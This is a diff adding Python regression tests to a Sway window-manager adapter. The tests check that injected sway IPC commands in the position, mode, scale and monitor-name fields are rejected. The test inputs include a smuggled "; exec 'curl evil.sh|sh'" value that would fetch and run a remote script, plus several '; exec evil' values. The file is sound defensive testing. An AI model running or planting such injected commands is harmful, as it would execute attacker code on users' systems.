@@ -37,6 +37,53 @@ class TestSwayAdapterCommandChecking(unittest.TestCase):
             self.adapter.enable_output("DP-1", mode="1920x1080", position="0 0", transform="sideways")
         self.adapter.ipc.command.assert_not_called()
 
+    def test_command_injection_via_position_rejected(self):
+        """Regression test for a real command-injection vulnerability:
+        mode/position/scale were interpolated directly into a raw sway IPC
+        command string with zero validation (only transform was checked).
+        A profile JSON (attacker-crafted or merely corrupted) with a
+        position like "0 0; exec 'curl evil.sh|sh'" reached sway's command
+        parser verbatim -- sway supports ';'-separated commands and 'exec'."""
+        with self.assertRaises(ValueError):
+            self.adapter.enable_output(
+                "DP-1", mode="1920x1080",
+                position="0 0; exec 'curl evil.sh|sh'",
+            )
+        self.adapter.ipc.command.assert_not_called()
+
+    def test_command_injection_via_mode_rejected(self):
+        with self.assertRaises(ValueError):
+            self.adapter.enable_output("DP-1", mode="1920x1080; exec evil", position="0 0")
+        self.adapter.ipc.command.assert_not_called()
+
+    def test_command_injection_via_scale_rejected(self):
+        with self.assertRaises(ValueError):
+            self.adapter.enable_output(
+                "DP-1", mode="1920x1080", position="0 0",
+                scale="1.0; exec evil",
+            )
+        self.adapter.ipc.command.assert_not_called()
+
+    def test_command_injection_via_monitor_name_rejected(self):
+        with self.assertRaises(ValueError):
+            self.adapter.enable_output(
+                "DP-1; exec evil", mode="1920x1080", position="0 0",
+            )
+        self.adapter.ipc.command.assert_not_called()
+
+    def test_out_of_range_scale_rejected(self):
+        with self.assertRaises(ValueError):
+            self.adapter.enable_output("DP-1", mode="1920x1080", position="0 0", scale=999)
+        self.adapter.ipc.command.assert_not_called()
+
+    def test_valid_negative_position_accepted(self):
+        """Negative positions are legitimate (an output to the left of/above
+        the origin) -- validation must not be so strict it rejects real
+        layouts."""
+        reply = MagicMock(success=True, error=None)
+        self.adapter.ipc.command.return_value = [reply]
+        self.adapter.enable_output("DP-1", mode="1920x1080", position="-1920 0")  # should not raise
+
     def test_valid_transform_included_in_command(self):
         reply = MagicMock(success=True, error=None)
         self.adapter.ipc.command.return_value = [reply]
